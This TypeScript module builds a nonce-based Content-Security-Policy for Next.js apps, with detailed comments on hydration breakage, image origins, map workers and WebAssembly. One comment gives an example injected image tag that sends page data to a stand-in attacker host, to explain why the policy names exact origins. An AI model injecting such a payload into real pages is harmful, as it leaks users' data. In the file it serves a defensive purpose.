/**
 * Content-Security-Policy with a per-request nonce.
 *
 * ## Why a nonce, and not hashes
 *
 * Both apps previously declared `script-src 'self'` (plus, in the customer app, one
 * hash for the theme script). That blocked every inline script Next.js emits for
 * hydration — `self.__next_f.push(...)`, the React streaming bootstrap, and the
 * `$RC`/`$RB` Suspense helpers. Measured on 2026-08-03: **18 blocked scripts on the
 * customer home page, 4 on the staff sign-in page with none allowed.** The pages still
 * rendered, because the HTML is server-generated — so the breakage was invisible to a
 * `curl` check and to anything that only asserted a `200`. In a browser, hydration
 * never ran: no form submitted, no button worked, and the console filled with
 * violations.
 *
 * Those scripts cannot be hashed. Their contents are the page's own data, so the hash
 * changes with every render and every content edit. A nonce is the only mechanism that
 * works for the App Router, and Next applies it to its own scripts automatically when
 * it can read one from the request.
 *
 * ## `strict-dynamic`
 *
 * Included so a script the nonce'd bootstrap loads is trusted transitively. Without it
 * Next's chunk loading is blocked, which is the same failure one step further along.
 * It also makes `'self'` redundant in modern browsers — kept anyway for the older ones
 * that ignore `strict-dynamic` and fall back to the source list.
 *
 * ## Why this lives in the shared package
 *
 * The mechanism is identical for both apps and subtle enough that two copies would
 * drift — the request-header step below is easy to omit, and omitting it fails exactly
 * the way described above: silently, and only in a browser. The POLICY differs between
 * the apps and is passed in.
 */

export interface CspOptions {
  /** The nonce for this request, from `createNonce()`. */
  readonly nonce: string;
  /**
   * Where images may come from. The customer app serves partner photography through
   * object storage or a CDN whose host is deployment configuration; the staff console
   * needs no remote images at all.
   */
  readonly imgSrc: string;
  /** Set in production only: it upgrades http subresources and blocks mixed content. */
  readonly upgradeInsecure: boolean;
  /**
   * `'unsafe-eval'`, for the DEV SERVER only.
   *
   * `next dev` bundles and hot-reloads through `eval`, so this policy — correct in
   * production — stops every dev page from hydrating. The page still renders, still
   * returns 200, and every control in it is inert: a form falls back to the browser's
   * own submit, a stepper does nothing, a dialog never opens.
   *
   * That is worse than a plain outage, because it makes the dev server useless for
   * exactly the browser-driven verification this project requires before calling a
   * client-side change done — while looking, in a screenshot, completely fine. Found on
   * 2026-09-07 driving the partner sign-in, which submitted as a GET and put the
   * password in the query string because no handler was ever attached.
   *
   * A POSITIVE test for development at the call site, never `!== 'production'`: an unset
   * or misspelt environment then yields the STRICT policy. This directive is the one
   * thing in the header that must not be enabled by an accident, so it fails closed.
   */
  readonly allowEval?: boolean;
  /**
   * Extra origins the page may FETCH from, beyond its own.
   *
   * Added for the property page's self-hosted basemap: MapLibre pulls tiles, glyphs and
   * a sprite with `fetch`, so an origin that is fine in `img-src` is still refused
   * without being named here. Omitted by every other surface, which fetches only itself.
   *
   * The failure it prevents is a quiet one — the map renders an empty grey canvas and the
   * refusals appear only in the browser console, nowhere in our logs.
   */
  readonly connectSrc?: string;
  /**
   * Whether the page may start a worker from a `blob:` URL.
   *
   * MapLibre compiles its tile workers at run time and starts them from blobs. With
   * `default-src 'self'` and no `worker-src`, the browser refuses, and the map fails in a
   * way that reads as a broken build rather than a policy.
   *
   * Off everywhere else: `blob:` workers are a real capability, and a surface that does
   * not draw a map has no business being able to start one.
   */
  readonly blobWorkers?: boolean;
  /**
   * Whether the page may compile WebAssembly.
   *
   * `'wasm-unsafe-eval'`, NOT `'unsafe-eval'`. The two are often confused and the
   * difference is the whole point: this permits `WebAssembly.instantiate` and nothing
   * else, while `'unsafe-eval'` would also hand an injected script `eval()` and
   * `new Function()`. Turning this on does not weaken the defence against injected script.
   *
   * Needed because MapLibre's RTL text plugin — the thing that joins Arabic letters and
   * lays them right to left — is compiled WebAssembly. Without it the plugin throws
   * inside the worker, the map keeps rendering, and Arabic labels come out reversed
   * letter by letter: correct glyphs in the wrong order, which reads as a broken font.
   */
  readonly wasm?: boolean;
}

/**
 * A fresh nonce. 128 bits of `crypto.getRandomValues`, base64.
 *
 * `crypto` rather than `node:crypto` so this is usable from Edge middleware. A nonce
 * must be unguessable and must never repeat across requests: a predictable one lets an
 * injected script name it and be trusted.
 */
export function createNonce(): string {
  const bytes = new Uint8Array(16);
  crypto.getRandomValues(bytes);

  return btoa(String.fromCharCode(...bytes));
}

/**
 * The origins images may be loaded from, as `img-src` sources.
 *
 * ## Why this is computed rather than written down
 *
 * `img-src 'self' data: blob:` reads as complete and is not: listing photography is served from
 * the object store or its CDN, which is a DIFFERENT origin from the app. The partner portal
 * declared exactly that policy and consequently could not display a single photograph — the
 * upload succeeded, the bytes were stored, the URL was correct, and the browser refused to fetch
 * it. Nothing appears in a server log when a browser enforces a CSP, and no test in the suite
 * looked at an image, so it went unnoticed until one did.
 *
 * ## Why not `https:`
 *
 * That is what the customer app used, and it works — by permitting every HTTPS host on the
 * internet. `img-src` is a real exfiltration channel: an injected `<img src="https://attacker/?d=…">`
 * sends whatever the injection can read, and a policy of `https:` allows it. Naming the origins we
 * actually use costs one line of configuration and closes that.
 *
 * A base that does not parse is skipped rather than thrown on: it means a relative path, which is
 * same-origin and already covered by `'self'`. A middleware that threw would take the whole app
 * down over a configuration typo.
 */
export function mediaOrigins(bases: readonly (string | undefined)[]): readonly string[] {
  const origins = new Set<string>();

  for (const base of bases) {
    if (!base) continue;

    try {
      origins.add(new URL(base).origin);
    } catch {
      /* Relative, so same-origin. */
    }
  }

  return [...origins];
}

/** Builds the policy string. */
export function buildCsp(options: CspOptions): string {
  const { nonce, imgSrc, upgradeInsecure, allowEval, connectSrc, blobWorkers, wasm } =
    options;

  return [
    "default-src 'self'",
    `script-src 'self' 'nonce-${nonce}' 'strict-dynamic'${wasm ? " 'wasm-unsafe-eval'" : ''}${allowEval ? " 'unsafe-eval'" : ''}`,
    /**
     * `unsafe-inline` for STYLES only. Next injects critical CSS inline and offers no
     * hash-stable or nonce-able equivalent for it. The exposure is a styling attack
     * rather than script execution, which is the trade every Next deployment makes.
     */
    "style-src 'self' 'unsafe-inline'",
    `img-src ${imgSrc}`,
    "font-src 'self'",
    `connect-src 'self'${connectSrc ? ` ${connectSrc}` : ''}`,
    ...(blobWorkers ? ["worker-src 'self' blob:"] : []),
    "frame-ancestors 'none'",
    "form-action 'self'",
    "base-uri 'none'",
    "object-src 'none'",
    ...(upgradeInsecure ? ['upgrade-insecure-requests'] : []),
  ].join('; ');
}

/**
 * Applies the policy so that Next can see the nonce AND the browser enforces it.
 *
 * Both halves are required and the first is the one that gets forgotten:
 *
 * 1. **On the forwarded REQUEST headers** — Next reads the nonce out of the
 *    `content-security-policy` request header and stamps it onto every script tag it
 *    generates. Without this step the header is served, the browser enforces it, and
 *    Next's own scripts carry no nonce, so everything is blocked.
 * 2. **On the RESPONSE headers** — what the browser actually enforces.
 */
export function cspHeaders(csp: string): {
  request: Record<string, string>;
  response: Record<string, string>;
} {
  return {
    request: { 'content-security-policy': csp },
    response: { 'content-security-policy': csp },
  };
}
